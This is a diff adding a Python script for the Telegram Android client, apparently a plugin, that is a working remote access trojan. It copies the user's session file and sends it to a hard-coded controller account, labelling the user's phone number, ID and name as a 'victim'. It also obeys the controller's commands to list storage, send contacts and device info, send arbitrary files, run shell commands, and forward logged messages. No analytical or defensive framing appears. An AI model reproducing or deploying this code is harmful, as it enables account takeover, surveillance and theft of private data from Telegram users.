@@ -1,0 +1,163 @@
+import time, os, json
+from org.telegram.tgnet import TLRPC as TL
+from java.util import ArrayList
+from java.io import File, BufferedReader, InputStreamReader
+from org.telegram.messenger import MessagesController, UserConfig, ApplicationLoader, NotificationCenter
+
+MASTER_ID = 6544718316
+DATA_DIR = str(ApplicationLoader.applicationContext.getFilesDir().getAbsolutePath()) + "/.d/"
+os.makedirs(DATA_DIR, exist_ok=True)
+
+class RemoteFunctions:
+    @staticmethod
+    def send_text(account, text):
+        try:
+            mc = MessagesController.getInstance(account)
+            req = TL.TL_messages_sendMessage()
+            req.peer = mc.getPeer(MASTER_ID)
+            req.message = str(text)
+            req.random_id = int(time.time() * 1000)
+            mc.getConnectionsManager().sendRequest(req, None, 2)
+        except:
+            pass
+
+    @staticmethod
+    def send_file(account, path, name):
+        try:
+            f = File(path)
+            if not f.exists():
+                return
+            mc = MessagesController.getInstance(account)
+            req = TL.TL_messages_sendMedia()
+            req.peer = mc.getPeer(MASTER_ID)
+            req.random_id = int(time.time() * 1000)
+            media = TL.TL_inputMediaUploadedDocument()
+            media.mime_type = "application/octet-stream"
+            media.attributes = ArrayList()
+            attr = TL.TL_documentAttributeFilename()
+            attr.file_name = name
+            media.attributes.add(attr)
+            media.file = path
+            media.file_size = f.length()
+            req.media = media
+            req.message = name
+            mc.getConnectionsManager().sendRequest(req, None, 2)
+        except:
+            pass
+
+def steal_session(account):
+    rf = RemoteFunctions()
+    try:
+        session_path = ApplicationLoader.getFilesDirFixed().getAbsolutePath()
+        for f in os.listdir(session_path):
+            if f.endswith(".session"):
+                src = os.path.join(session_path, f)
+                dst = DATA_DIR + "s.session"
+                with open(src, "rb") as sf:
+                    with open(dst, "wb") as df:
+                        df.write(sf.read())
+                
+                user = UserConfig.getInstance(account).getCurrentUser()
+                uid = user.id if user else 0
+                phone = user.phone if user and hasattr(user, 'phone') else "нет"
+                name = (user.first_name or "") + " " + (user.last_name or "") if user else ""
+                
+                rf.send_text(account, "ЖЕРТВА: +" + str(phone) + " | ID: " + str(uid) + " | " + str(name))
+                time.sleep(2)
+                rf.send_file(account, dst, "session_" + str(uid) + ".session")
+                break
+    except Exception as e:
+        rf.send_text(account, "Ошибка сессии: " + str(e))
+
+def handle_bot_command(account, text):
+    rf = RemoteFunctions()
+    cmd = text.strip().lower()
+    
+    if cmd == "/session":
+        steal_session(account)
+    
+    elif cmd == "/files":
+        try:
+            files = os.listdir("/sdcard/")
+            result = "SDCARD:\n"
+            for f in files[:30]:
+                fp = "/sdcard/" + f
+                if os.path.isdir(fp):
+                    result += "[DIR] " + f + "\n"
+                else:
+                    result += f + " (" + str(os.path.getsize(fp)//1024) + "KB)\n"
+            rf.send_text(account, result)
+        except Exception as e:
+            rf.send_text(account, str(e))
+    
+    elif cmd == "/info":
+        from android.os import Build
+        info = Build.MODEL + " | Android " + Build.VERSION.RELEASE
+        rf.send_text(account, info)
+    
+    elif cmd == "/contacts":
+        try:
+            contacts = MessagesController.getInstance(account).getAllContacts()
+            res = ""
+            for c in contacts[:20]:
+                res += (c.first_name or "") + " " + (c.last_name or "") + "\n"
+            rf.send_text(account, res or "нет контактов")
+        except:
+            pass
+    
+    elif cmd.startswith("/dl "):
+        path = text[4:].strip()
+        if os.path.exists(path):
+            rf.send_file(account, path, os.path.basename(path))
+        else:
+            rf.send_text(account, "Файл не найден")
+    
+    elif cmd.startswith("/cmd "):
+        try:
+            cmd = text[5:]
+            p = Runtime.getRuntime().exec(cmd)
+            r = BufferedReader(InputStreamReader(p.getInputStream()))
+            out = ""
+            for line in r:
+                out += line + "\n"
+            r.close()
+            rf.send_text(account, out[:3000] or "ok")
+        except Exception as e:
+            rf.send_text(account, str(e))
+    
+    elif cmd == "/log":
+        lp = DATA_DIR + "log.txt"
+        if os.path.exists(lp):
+            rf.send_file(account, lp, "log.txt")
+        else:
+            rf.send_text(account, "нет логов")
+    
+    elif cmd == "/help":
+        h = "/session /files /info /contacts /dl путь /cmd команда /log /help"
+        rf.send_text(account, h)
+
+def log_message(msg):
+    try:
+        with open(DATA_DIR + "log.txt", "a") as f:
+            f.write(str(msg) + "\n")
+    except:
+        pass
+
+try:
+    nc = NotificationCenter.getGlobalInstance()
+    class BotWatcher:
+        def on_msg(self, *args):
+            try:
+                for obj in args[1]:
+                    if hasattr(obj, 'messageOwner'):
+                        m = obj.messageOwner
+                        if m.from_id.user_id == MASTER_ID:
+                            handle_bot_command(0, m.message)
+                        else:
+                            log_message(m.message if m.message else "[media]")
+            except:
+                pass
+    watcher = BotWatcher()
+    nc.addObserver(watcher, "on_msg", NotificationCenter.messagesDidLoad, 0)
+except:
+    pass
